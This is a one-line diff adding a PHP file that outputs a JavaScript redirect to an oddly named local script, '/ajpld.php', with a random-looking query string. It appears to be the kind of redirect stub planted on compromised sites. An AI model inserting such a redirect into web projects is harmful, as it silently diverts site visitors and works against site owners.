@@ -1,0 +1,1 @@
+<?php echo '<script> location.href=\'/ajpld.php?FOx=OYvsp\'; </script>'; ?>
